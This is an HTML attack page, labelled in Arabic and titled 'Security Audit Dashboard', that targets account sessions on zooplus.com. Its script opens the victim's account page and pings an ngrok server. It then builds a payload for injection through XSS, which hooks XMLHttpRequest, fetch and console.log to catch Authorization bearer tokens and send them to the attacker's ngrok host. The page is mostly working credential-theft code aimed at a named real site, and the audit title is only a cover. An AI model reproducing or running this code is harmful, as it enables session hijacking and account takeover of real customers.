<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Security Audit Dashboard</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; text-align: center; padding: 50px; }
        .box { border: 2px solid #00ff00; padding: 20px; display: inline-block; box-shadow: 0 0 20px #00ff00; }
        button { background: #00ff00; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; }
        .status { margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <div class="box">
        <h2>[!] نظام تسميم التبعيات والاعتراض (Dependency Poisoning)</h2>
        <p>الهدف: zooplus.com</p>
        <p>السيرفر: <span id="ngrok-link">subsphenoidal-dauntlessly-pura.ngrok-free.dev</span></p>
        <hr color="#00ff00">
        <button onclick="deployPoison()">إطلاق الهجوم (Deploy Poison)</button>
        <div class="status" id="stat">بانتظار الأوامر...</div>
    </div>

    <script>
        const NGROK_URL = 'https://subsphenoidal-dauntlessly-pura.ngrok-free.dev';

        function deployPoison() {
            // 1. فتح نافذة الضحية
            const victimWin = window.open('https://www.zooplus.com/account/overview', 'Victim');
            document.getElementById('stat').innerText = "تم فتح الهدف. بانتظار تفعيل التسميم...";

            // 2. إرسال إشارة البدء لـ Ngrok
            navigator.sendBeacon(NGROK_URL, JSON.stringify({ event: "POISON_DEPLOYED" }));

            /* هذا هو "كود التسميم" الذي سنحقنه. 
               سيقوم بتبديل وظائف المتصفح الأصلية بوظائفنا الخبيثة.
            */
            const poisonPayload = `
                (function() {
                    const NGROK = '${NGROK_URL}';
                    const log = (type, data) => navigator.sendBeacon(NGROK, JSON.stringify({ type, data }));

                    // تسميم XMLHttpRequest (لاعتراض التوكن من الهيدرز الصادرة)
                    const oldSetHeader = XMLHttpRequest.prototype.setRequestHeader;
                    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
                        if (header.toLowerCase() === 'authorization') {
                            log("JWT_STOLEN_VIA_XHR", { token: value });
                        }
                        return oldSetHeader.apply(this, arguments);
                    };

                    // تسميم fetch (لاعتراض التوكن في الطلبات الحديثة)
                    const oldFetch = window.fetch;
                    window.fetch = async (...args) => {
                        const options = args[1] || {};
                        const auth = options.headers ? (options.headers['Authorization'] || options.headers['authorization']) : null;
                        if (auth) log("JWT_STOLEN_VIA_FETCH", { url: args[0], token: auth });
                        return oldFetch.apply(this, args);
                    };

                    // صيد أي بيانات حساسة تظهر في الـ Logs (Sentry Leakage)
                    const oldLog = console.log;
                    console.log = function(...args) {
                        const str = JSON.stringify(args);
                        if (str.includes("token") || str.includes("Bearer")) {
                            log("TOKEN_FOUND_IN_CONSOLE", args);
                        }
                        return oldLog.apply(console, args);
                    };

                    console.log("%c [!] Poison Active. Monitoring all traffic...", "color: red;");
                })();
            `;
            
            // المهاجم هنا سيقوم بنسخ هذا الكود أو حقنه عبر ثغرة XSS
            console.log("الآن قم بحقن هذا الكود في صفحة الضحية:");
            console.log(poisonPayload);
        }
    </script>
</body>
</html>
